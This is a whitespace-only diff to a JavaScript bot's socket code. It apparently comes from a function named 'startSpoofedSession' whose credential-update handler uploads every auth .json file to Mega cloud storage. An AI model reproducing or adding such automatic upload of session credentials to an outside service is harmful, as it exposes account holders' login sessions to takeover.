@@ -200,18 +200,18 @@ async function startSpoofedSession() {
     globalSock = sock
 
     sock.ev.on('creds.update', async () => {
-    await saveCreds()
-    try {
-        const files = readdirSync(AUTH_DIR)
-        for (const file of files) {
-            if (file.endsWith('.json')) {
-                await uploadFileToMega(file)
+        await saveCreds()
+        try {
+            const files = readdirSync(AUTH_DIR)
+            for (const file of files) {
+                if (file.endsWith('.json')) {
+                    await uploadFileToMega(file)
+                }
             }
+        } catch (e) {
+            console.log('[Mega] Error during creds update:', e.message)
         }
-    } catch (e) {
-        console.log('[Mega] Error during creds update:', e.message)
-    }
-})
+    })
 
     sock.ev.on('connection.update', (update) => {
         const { connection, lastDisconnect, qr } = update
